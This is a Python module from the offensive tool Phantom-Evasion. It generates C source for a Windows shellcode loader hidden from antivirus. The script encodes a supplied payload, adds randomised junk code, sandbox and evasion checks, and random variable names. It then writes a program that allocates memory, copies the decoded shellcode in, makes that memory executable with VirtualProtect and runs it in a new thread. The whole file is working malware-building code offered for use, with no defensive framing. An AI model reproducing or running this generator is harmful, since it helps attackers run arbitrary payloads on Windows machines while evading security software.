
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import sys
from random import shuffle  
sys.path.append("Modules/payloads/auxiliar")
from usefull import encoding_manager
from usefull import varname_creator
from usefull import Junkmathinject
from usefull import windows_evasion
from usefull import spawn_multiple_process
from usefull import close_brackets_multiproc

Payload = sys.argv[1]

SpawnMultiProc = int(sys.argv[2])

Encryption = sys.argv[3]

Randbufname = varname_creator()

DecodeKit = encoding_manager(Encryption,Payload,Randbufname)

Payload = DecodeKit[0]     # encoded shellcode 

DecoderStub = DecodeKit[1] # decoder stub or string = False if decoder is not necessary

Ndcvirtual = varname_creator()

Ker32 = varname_creator()

Randlpv = varname_creator()

Randhand = varname_creator()

Randresult = varname_creator()

Randthread = varname_creator()

Oldprot = varname_creator()

Randbool = varname_creator()

Ndcvirtualpro = varname_creator()


Junkcode_01 = Junkmathinject()
Junkcode_02 = Junkmathinject()
Junkcode_03 = Junkmathinject()
Junkcode_04 = Junkmathinject()
Junkcode_05 = Junkmathinject()
Junkcode_06 = Junkmathinject()
Junkcode_07 = Junkmathinject()
Junkcode_08 = Junkmathinject()
Junkcode_09 = Junkmathinject()
Junkcode_10 = Junkmathinject()
Junkcode_11 = Junkmathinject()
Junkcode_12 = Junkmathinject()
Junkcode_13 = Junkmathinject()
Junkcode_14 = Junkmathinject()
Junkcode_15 = Junkmathinject()
Junkcode_16 = Junkmathinject()
Junkcode_17 = Junkmathinject()
Junkcode_18 = Junkmathinject()
Junkcode_19 = Junkmathinject()
Junkcode_20 = Junkmathinject()
Junkcode_21 = Junkmathinject()
Junkcode_22 = Junkmathinject()

WinEvasion_01 = windows_evasion()
WinEvasion_02 = windows_evasion()
WinEvasion_03 = windows_evasion()
WinEvasion_04 = windows_evasion()
WinEvasion_05 = windows_evasion()
WinEvasion_06 = windows_evasion()
WinEvasion_07 = windows_evasion()
WinEvasion_08 = windows_evasion()
WinEvasion_09 = windows_evasion()


Hollow_code = ""

Include_List = ["#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <math.h>\n\n","#include <time.h>\n","#include <math.h>\n"]

shuffle(Include_List)

for i in range(0,len(Include_List)):

    Hollow_code += Include_List[i]

Hollow_code += "int main(int argc,char * argv[]){\n"
Hollow_code += Junkcode_01
Hollow_code += Junkcode_02
Hollow_code += Junkcode_03
Hollow_code += WinEvasion_01
Hollow_code += WinEvasion_02
Hollow_code += WinEvasion_03
Hollow_code += WinEvasion_04
Hollow_code += Junkcode_04
Hollow_code += WinEvasion_05
Hollow_code += WinEvasion_06
Hollow_code += WinEvasion_07
Hollow_code += Junkcode_05
Hollow_code += WinEvasion_08
Hollow_code += WinEvasion_09
Hollow_code += Junkcode_06
Hollow_code += Junkcode_07
Hollow_code += spawn_multiple_process(SpawnMultiProc)
Hollow_code += Payload 
Hollow_code += "LPVOID " + Randlpv + ";\n"
Hollow_code += "HANDLE " + Randhand + ";\n"
Hollow_code += "DWORD " + Randresult + ";DWORD " + Randthread + ";\n"
Hollow_code += Junkcode_08
Hollow_code += "HINSTANCE " + Ker32 + " = LoadLibrary(\"kernel32.dll\");\n"
Hollow_code += Junkcode_09
Hollow_code += "if(" + Ker32 + " != NULL){\n"
Hollow_code += Junkcode_10
Hollow_code += "FARPROC " + Ndcvirtual + " = GetProcAddress(" + Ker32 + ", \"VirtualAlloc\");\n"
Hollow_code += Junkcode_11
Hollow_code += Randlpv + " = (LPVOID)" + Ndcvirtual + "(NULL, strlen(" + Randbufname + "),MEM_COMMIT,PAGE_READWRITE);\n"
Hollow_code += Junkcode_12
if DecoderStub != "False":
    Hollow_code += DecoderStub
Hollow_code += "RtlMoveMemory(" + Randlpv +","+ Randbufname + ",strlen(" + Randbufname + "));\n"
Hollow_code += "DWORD " + Oldprot + ";\n"
Hollow_code += Junkcode_13
Hollow_code += "FARPROC " + Ndcvirtualpro + " = GetProcAddress(" + Ker32 + ", \"VirtualProtect\");\n"
Hollow_code += Junkcode_14
Hollow_code += "BOOL " + Randbool + " = (BOOL)" + Ndcvirtualpro + "(" + Randlpv + ",strlen(" + Randbufname + "),0x40,&" + Oldprot + ");\n"
Hollow_code += Junkcode_15
Hollow_code += Randhand + " = CreateThread(NULL,0," + Randlpv + ",NULL,0,&"+ Randthread + ");\n"
Hollow_code += Randresult + " = WaitForSingleObject(" + Randhand + ",-1);}\n"
Hollow_code += close_brackets_multiproc(SpawnMultiProc)
Hollow_code += "}}}else{" + Junkcode_16 + "}\n"
Hollow_code += "}else{" + Junkcode_17 + "}\n"
Hollow_code += "}else{" + Junkcode_18 + "}\n"
Hollow_code += "}else{" + Junkcode_19 + "}\n"
Hollow_code += "}else{" + Junkcode_20 + "}\n"
Hollow_code += "}else{" + Junkcode_21 + "}\n"
Hollow_code += "}else{" + Junkcode_22 + "}\n"
Hollow_code += "return 0;}"
Hollow_code = Hollow_code.encode('utf-8')

with open('Source.c','wb') as f:
    f.write(Hollow_code)


